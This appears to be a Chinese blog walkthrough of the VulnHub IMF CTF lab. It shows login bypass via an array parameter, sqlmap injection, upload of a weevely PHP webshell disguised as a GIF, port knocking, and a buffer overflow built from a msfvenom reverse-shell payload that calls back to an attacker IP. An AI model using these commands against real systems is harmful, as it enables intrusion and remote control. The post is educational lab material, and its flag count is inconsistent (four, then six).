> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/UAHb6E1CvnSeyuVVS0BGUg)

靶机地址：https://www.vulnhub.com/entry/imf-1,162/

靶机难度：中级（CTF）

靶机发布日期：2016 年 10 月 30 日

靶机描述：欢迎使用 “IMF”，这是我的第一个 Boot2Root 虚拟机。IMF 是一个情报机构，您必须骇入所有标志并最终扎根。这些标志起步容易，随着您的前进而变得越来越难。每个标志都包含下一个标志的提示。我希望您喜欢这个虚拟机并学到一些东西。

目标：得到 root 权限 & 找到四个 flag.txt

![](https://mmbiz.qpic.cn/mmbiz_png/gCicgvu68od8ibyiahYEJ6XV4kkaUeCEMF4HvIuuPYGVxwMtGDTnb3ibDXjDke8TFG6yicwwEJ2Ik6QzI6c7oT5iczvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MKHUQ8R7BXBibc5TT0bsGFoG25ZFjUbyQtK7icU5VDD6Lxme5yKgoWpaDXd9HmZ1kfkhR3dbQ80dlu2jHJBSkCPQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VGhME4y0QLo3MIKX2xqqYXyKcoyCiaukQAj90M7CCMfhUskicraSNIaK2icT70MmUaHEJKiat91cPOZRkEs78qAHlQ/640?wx_fmt=png)

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

一、信息收集

  

  

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57v8u0yNkX2HIKTicjicChIerb9hGW3jurNpnqAibdT4ibTAqC807RZBkl4w/640?wx_fmt=png)

我们已经找到了此次 CTF 目标计算机 IP 地址：

```
192.168.182.151
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57ibL8L7cd375xRF0AHIkyYQ1AQibWUGJCAHDm3A9hgKFbhnfjecIhVa3w/640?wx_fmt=png)

nmap 扫描发现，80 端口上运行着 Apache，利用 IP 地址直接访问网页...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57iafCOQagHjVEDxSianpbWVTu4ibUSKL2aW78QHVibg3WULs52LicibkFN35Q/640?wx_fmt=png)

这边看到有三个选项卡，在第三个 contact us 源代码找到了 flag1 信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57R08j0kvsia5Y6dSOzChNPq43rl5sowQAoAFgicDJQWQFOUDft1hk686A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57xP2LmlM5TLl1UJLd5GicXPbT3JQIw8jTXu7KT62sqD3XvAnLXbpyFLA/640?wx_fmt=png)

```
flag1{YWxsdGhlZmlsZXM=}
```

这是一个 base64 值，用 bp 进行破解（最近时间紧迫，就不介绍很详细了，直接过不懂得直接来找我）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57zhSUWOkCpP8MHiaDlyndkWRVgE6JJlGmpiaU3AcM485819grP1LwxBDQ/640?wx_fmt=png)

解码值：

```
allthefiles
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57633Y6SmAckusEicS50ia5EJ7NEicZaydibsFgNZHeUTlcXsUly10tLmicOw/640?wx_fmt=png)

继续搜索看看还有 base64 值吗，搜到还有，继续解码

```
eVlYUnZjZz09fQ==
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57Ah6KGwGE3FaCP7RIz9HjSRUHwDibn1ibTvI1akqVtrmrxDibofjeibVgJg/640?wx_fmt=png)

这里解码不对，在回去仔细看发现是连在一起的... 继续解码

```
ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57VZa9vBsicU74ATAOGIbScDh6TVIWcV8ialMhJFqIwGo1bceDd03iaNswA/640?wx_fmt=png)

解码值：

```
flag2{aW1mYWRtaW5pc3RyYXRvcg==}
```

一环套一环，还是 base 值，继续解码

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57asxfRqZbcKTc7loTll6vFFTfUYOcicqsic3beKI8GQhcVPzib17y6L93w/640?wx_fmt=png)

```
aW1mYWRtaW5pc3RyYXRvcg==
解码值：imfadministrator
前面flag1解码值：allthefiles
```

二、web 渗透

  

  

访问目录试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57YPDk0zoXmag1RFY8Pu8xFsJWsE0l2h5ysYBr19g7WAyWKapicStrQVw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57DIPhgXK5g0NfJFDkNKSgXqdO3qyLvPicHicgMRTp5BlybYxyrfq9k6Fg/640?wx_fmt=png)

imfadministrator 目录可以访问，没用用户名密码

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57dBxKqSruj1Jh3OjuicB0797LspKV0CKwzv7WqH6NcQfSa3nKpj0pCgw/640?wx_fmt=png)

查看源代码，我使用 user/pass 登陆试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57sNAH5X2CZG3hUnTj6ic5iaC89GDSh36FJwzUerCwvKSBFpqicbQSf0fwg/640?wx_fmt=png)

无效的用户名，没信息了，回到最初页面看看 contact us 里还有啥信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57icFqyEzc818IOYcfrqBw8a8hrgiaKgNd9iaUQNfVfCzKTMO8kmnniaN7QA/640?wx_fmt=png)

这里有三个用户：rmichaels、akeith、estone

这边下面是另外一种新知识

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57rFEadUVuornB7MS8qneibVWJOKFTrWsw9CiastUB2nW0NFjSLQNwiamzQ/640?wx_fmt=png)

用 bp 去拦截他请求的数据包，在把数据越过检测

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57j1wfJzktkMboWNKJWN7rPDYJwP1B7hZ9Kiaq0hyCcAJO0jiasfFib8M8w/640?wx_fmt=png)

输入一个随意的账号密码

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57hqmx3RsIGH4o0JQDOqr8x7l7I0lGBS5AagD89VAslqYAbEKMen5e5w/640?wx_fmt=png)

我尝试发送一个空数组作为密码，通过将密码字段名称更改为 pass[]，但是 regex 函数无法通过

这边用 admin、administrator、imfadministrator 作为账号返回数值都和测试账号一样

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57VqzFcicn4WcvHQkTdJtWOzr41EIcE4aIe7np69qPQqOwEIoSclPz8rA/640?wx_fmt=png)

这边尝试用 rmichaels 用户，账号是对的，密码作为一个空数组越过了，获得了里面内容 flag3

```
flag3 {Y29udGludWVUT2Ntcw==}
解码：continueTOcms
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57gknkOlbsHf1iasmuhkkugyfe1eIr1znGXoQ1MRQhEGHxauWmictcuezg/640?wx_fmt=png)

通过登录后，继续查看信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57z23m6ux4FbiaEWEcftWC4PEyTvfP2osDBCtg8BY9SrTxotxdpLiadIAA/640?wx_fmt=png)

继续用 php 执行 SQL 注入攻击（可以看下方链接学习更多！！）

```
https://stackoverflow.com/questions/1885979/php-get-variable-array-injection
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57MbPaUsj3vOY4CuL4o0iaxSeJ9xj4sdMv5unWFUMFbiaibicemH1gc0832A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57r5dgTNGYeQHI3mYVAkPWBPOkpNwEVqTUbacUkXL4xj9ExKyQb4qlKA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57nXGupaJmGMEfZ77wREK636dibARrH7aJkhYt4Ho1P4ZBcyEkosn4KVg/640?wx_fmt=png)

我们需要找到底层目录，将截获的代码保存到本地中，进行 SQL 注入攻击

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57uY2icyAib51UPvQoCEuibbIFvRy8uemBsMVaYKhToKcM5Qo5yyFrKX5dw/640?wx_fmt=png)

```
命令：sqlmap -r dayusql --risk=3 --level=5 --dbs --dump --batch --threads=10
```

查看到底层有 jpg 文件，将他下载下来查看信息

```
/images/whiteboard.jpg
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57b2IzJOLNOlX3Lmibtl9G8TlYY82LzT7OoelcJA3AMKSTuMwGBBShV5Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57gZibAMuFzwDJEpk9IXWC9ianEGcDe7YLfSDGhO6bj7kVMEgcv0dpCusg/640?wx_fmt=png)

发现有个二维码，666，手机微信扫一扫发现 flag4（你可以用手机试试）

```
flag4{dXBsb2Fkcjk0Mi5waHA=}
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57BeGibIX1Q4pB18JG5P3sMcnIgmVO41LZyUvmxSKia7jc4WFSdQ1icboOw/640?wx_fmt=png)

```
解码后：uploadr942.php
```

三、文件上传提权

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57cjLYkHCibDhQX9wg8eDCACqJ5IXxJmiaWbFxJxhtspbCoQkwE7ztw0Qg/640?wx_fmt=png)

发现这里可以上传文件

这边使用 weevely 来进行提权：

```
https://www.freebuf.com/sectool/39765.html
```

一般只能上传 jpg、png、gif 文件，这边我开始自己制作

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57l3gIv3Dz3ibJFUv41cebSQmx6H4oY8N10fb2WgCR0Uz2wBhjv8T9mbQ/640?wx_fmt=png)

搜索先用 weevely 生成 php 文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57USBrgdmxicqIaiaLUJJuIsFxdGGIJcibPGvjAXzia5kEm5gAarlhlGL1yQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57SbGHN6ZtLV0CfQia46zgajY3fDL5CIon1N1cfu9AtUHRWpGYVAEjIbw/640?wx_fmt=png)

将生成的 dayujiayou.php 代码经过拦截输入到 image 中

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57VcIME3ibVtS8O1zj5kibVoWa355G3ibiaDpLziaOzmDO8LdIVYrFNVByCNw/640?wx_fmt=png)

改名为 gif 文件

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz5775UumtNQDygzMKnVfHfryEYjszj16uNdpMmEqgnjo9cgA8FsuauWwg/640?wx_fmt=png)

随意添加 GIF 数值！！（制作木马）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz579SICSItzR3ibWKWuzbxZFPqxNBrtTSfeeb4ia8pkJEo1Uo54wqsnFQbA/640?wx_fmt=png)

成功上传，上传完后查看源代码！！

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz575AvicsLLOXBtvu4dOuiaIFYHW1Gibyo07BQe5iaZfF57zTEia0xDXzpibCibw/640?wx_fmt=png)

```
返回值：43384891653d（木马值）
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57AomZI7UbiaccRm5EiaoxdTfiaaOvOc3H2Sfp5CicCE56gSf4GibzgzP3Yvg/640?wx_fmt=png)

```
weevely http://192.168.182.151/imfadministrator/uploads/43384891653d.gif jesse
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz572PpA68ku1IgJxLMWtyZWgUTThYAbkU9ZqZ4CGmZNibthnh6KyC1XDkA/640?wx_fmt=png)

使用 weevely 链接木马，成功提到低权限，并查看到 flag5 信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57TQA6mhzN6WtEr1DN9B8Vdx48HhU5dEvBQxaa8f0tIibwa6H3ibgviajCQ/640?wx_fmt=png)

```
flag5{YWdlbnRzZXJ2aWNlcw==}
解码：agentservices
```

这里也可以用 metasploit 提权

flag5 是代理服务的意思那就跟着这条思路继续往下走....

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57GWmIkQExwWD9kU7x6czpLtxmZolPN2gmnLpwDibumgqb06ZcVpeI1eA/640?wx_fmt=png)

```
find / -name agent &>/dev/null
/usr/local/bin/agent
```

这使用 >/dev/null 把错误信息重定向到黑洞中，只留下正确的信息回显，这时候我们就能快速而准确的找到我们需要的文件了...

发现有代理在执行

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57iah6UtaoCkZib8iaJmdvOQgrpQ6t5LYXSeVujlzwQ2YddXT3F8IGsvURg/640?wx_fmt=png)

netstat 查看端口 7788 也有代理在执行

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57P3qRmkggHqEvUdwibicAD4p1WLrIOHqox0bEibuY1Nl6c7BnIpoo9qFZg/640?wx_fmt=png)

到 / usr/local/bin 目录下查看 access_codes 发现端口序列：7482 8279 9467

这边使用 knock 敲门（基于 python3 就是撬开端口的意思）

没有的先安装

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz5740liauNWfBNZ2EJ2QEqsl4nFmu35ruBv5zHfHvuFTeq3fk57oj07Hjw/640?wx_fmt=png)

```
git clone https://github.com/grongor/knock.git
```

安装完成

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57Hf9rghwvLfpCrGYWqflhTbictribh0PBklsaRuYDRwW0rqcic6uM5xRSQ/640?wx_fmt=png)

这边正常敲开了靶机的 7788 端口

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz579CYgvsTyhMyz56InHpkuJjAla2zfg1nNwypIYZv6vQe9f8cK5PurRw/640?wx_fmt=png)

现在不知道这 ID 是啥

这边需要二进制文件进行反向工程并获取代理程序 ID...（真难，我这里理解原理用了好多时间...）

前面我们运行 / usr/local/bin 目录下的 agent 会需要输入 ID，这边我们从 agent 文件下手

先把他传到 kali 本地

```
file_download /usr/local/bin/agent /root/agent
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57n1TzSJQBEMncicYRBEFsrXxdIpD7ZReteAp1zZZmlWFNJZ3tQgRj1Ww/640?wx_fmt=png)

这边查看到 agent 是 ELF32 位文件，将文件提权后执行，随意输入任意 ID，ID 不对退出后，使用 ltrace（跟踪进程调用库函数的情况）查看 agent 信息

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57gVJNq40icfgADSpVtahkJrZWYXE1cCdud7owyeicGicKoF8k4TCbNhA7g/640?wx_fmt=png)

随意输入 fgets(... 然后看到了 agent ID（这是有效的 ID，可以多次输入错误 ID 查看）

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57mrk1uECWsBM6R37wHFvfHRG0D90CxNzejcY7vUdc7Tpiaic83yFJhcVA/640?wx_fmt=png)

这边 ID 正确，其中选项 2 和 3 可以让用户输入内容，

如此看来是要通过缓冲区溢出 7788 端口的 agent 程序，这边用二进制修改 exp

为该程序创建一个利用程序，首先我们为 msfvenom 有效负载创建一个 shellcode

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57c7b3u2QLq5biclR9DgXpVotul5y6cALib27RBCa2G5H0ZUdvmTP0xX2w/640?wx_fmt=png)

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.182.149 LPORT=6666 -f python -b "\x00\x0a\x0b"
```

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz5764ouc6N17tbplu5Vyfg6XpprAcj7ria8NbpxvOKMZFsTw7ibObsIyICQ/640?wx_fmt=png)

利用二进制 py 修改 exp 进行提权

将文件写入本地 agentsploit.py 中

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KMAVke91NS1csbVjA1vwz57IicYHNIpaKaOrZCTDiamS8JTe7OiadjCULvkJicMBuXtqiackibMmmwgCY1g/640?wx_fmt=png)

```
flag6{R2gwc3RQcm90MGMwbHM=}
Gh0stProt0c0ls
```

这台靶机，涵盖了知识量挺大的，从熟悉 BP、写木马、gdb 拆解、二进制、缓冲区溢出等等，花了太多时间，这一切都是值得滴，一定要自己手动做，手动写，你才知道当你熟悉了，这些不是特别难，加油！！！

由于我们已经成功得到 root 权限 & 找到 6 个 flag.txt，因此完成了 CTF 靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/gCicgvu68od8ibyiahYEJ6XV4kkaUeCEMF4HvIuuPYGVxwMtGDTnb3ibDXjDke8TFG6yicwwEJ2Ik6QzI6c7oT5iczvg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MKHUQ8R7BXBibc5TT0bsGFoG25ZFjUbyQtK7icU5VDD6Lxme5yKgoWpaDXd9HmZ1kfkhR3dbQ80dlu2jHJBSkCPQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VGhME4y0QLo3MIKX2xqqYXyKcoyCiaukQAj90M7CCMfhUskicraSNIaK2icT70MmUaHEJKiat91cPOZRkEs78qAHlQ/640?wx_fmt=png)

如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~

![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)

星球每月都有网络安全书籍赠送、各种渗透干货分享、小伙伴们深入交流

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvyRzpZ9K5N6QrjibbJsVd3xX7Q4wDYSsBJYyNJdyjYabp5NkcDj9GEhA/640?wx_fmt=png)

欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！

渗透攻防：  

欢迎加入

大余安全

公众号

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvX3CVuhiba4mw8DqJicOMwaDJyErymjibZhiaZNKMtWzn2rX17pcK3Cd7Cw/640?wx_fmt=png)